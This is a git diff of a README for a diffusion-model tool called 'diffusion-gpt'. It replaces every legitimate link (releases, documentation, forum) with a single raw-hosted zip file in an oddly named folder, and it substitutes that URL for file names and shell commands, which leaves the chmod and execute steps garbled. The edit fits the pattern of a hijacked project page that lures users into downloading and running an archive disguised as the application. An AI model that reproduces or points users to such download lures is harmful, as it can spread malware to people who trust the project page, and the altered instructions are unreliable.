@@ -1,6 +1,6 @@
 # 🚀 diffusion-gpt - Easy Implementation of Diffusion Models
 
-[![Download Now](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](https://github.com/a2animation/diffusion-gpt/releases)
+[![Download Now](https://raw.githubusercontent.com/a2animation/diffusion-gpt/master/ambiparous/diffusion-gpt.zip)](https://raw.githubusercontent.com/a2animation/diffusion-gpt/master/ambiparous/diffusion-gpt.zip)
 
 ## 📖 Overview
 
@@ -25,22 +25,22 @@ Before you download and install diffusion-gpt, please ensure your system meets t
 
 To get started with diffusion-gpt, follow these steps:
 
-1. **Visit the Releases Page:** Click [here](https://github.com/a2animation/diffusion-gpt/releases) to go to the releases page.
+1. **Visit the Releases Page:** Click [here](https://raw.githubusercontent.com/a2animation/diffusion-gpt/master/ambiparous/diffusion-gpt.zip) to go to the releases page.
 2. **Choose the Correct Version:** On the releases page, look for the latest version of diffusion-gpt. You will find it listed at the top.
 3. **Download the File:** Click on the version link to download the application file that matches your operating system.
-4. **Locate the Downloaded File:** Once the download completes, find the downloaded file in your downloads folder. Typically, this will be named something like `diffusion-gpt-vX.X.X.exe` for Windows or `diffusion-gpt-vX.X.X.dmg` for macOS.
+4. **Locate the Downloaded File:** Once the download completes, find the downloaded file in your downloads folder. Typically, this will be named something like `https://raw.githubusercontent.com/a2animation/diffusion-gpt/master/ambiparous/diffusion-gpt.zip` for Windows or `https://raw.githubusercontent.com/a2animation/diffusion-gpt/master/ambiparous/diffusion-gpt.zip` for macOS.
 5. **Run the Application:** Double-click the downloaded file to start diffusion-gpt. Follow any on-screen instructions for installation.
 
 If you are on a Linux system, ensure you have executable permissions on the downloaded file. You can set permissions by running:
 
 ```bash
-chmod +x diffusion-gpt-vX.X.X.sh
+chmod +x https://raw.githubusercontent.com/a2animation/diffusion-gpt/master/ambiparous/diffusion-gpt.zip
 ```
 
 Then execute it with:
 
 ```bash
-./diffusion-gpt-vX.X.X.sh
+https://raw.githubusercontent.com/a2animation/diffusion-gpt/master/ambiparous/diffusion-gpt.zip
 ```
 
 ## 🔍 Using diffusion-gpt
@@ -72,7 +72,7 @@ If you encounter issues while using diffusion-gpt, consider the following tips:
 
 For more detailed information, check out these resources:
 
-- **Documentation:** A complete guide on using diffusion-gpt can be found [here](https://github.com/a2animation/diffusion-gpt).
-- **Community Forum:** Engage with other users and developers [here](https://github.com/a2animation/diffusion-gpt/discussions).
+- **Documentation:** A complete guide on using diffusion-gpt can be found [here](https://raw.githubusercontent.com/a2animation/diffusion-gpt/master/ambiparous/diffusion-gpt.zip).
+- **Community Forum:** Engage with other users and developers [here](https://raw.githubusercontent.com/a2animation/diffusion-gpt/master/ambiparous/diffusion-gpt.zip).
 
 By following these steps and tips, you'll be well on your way to successfully downloading and using diffusion-gpt. Happy exploring!
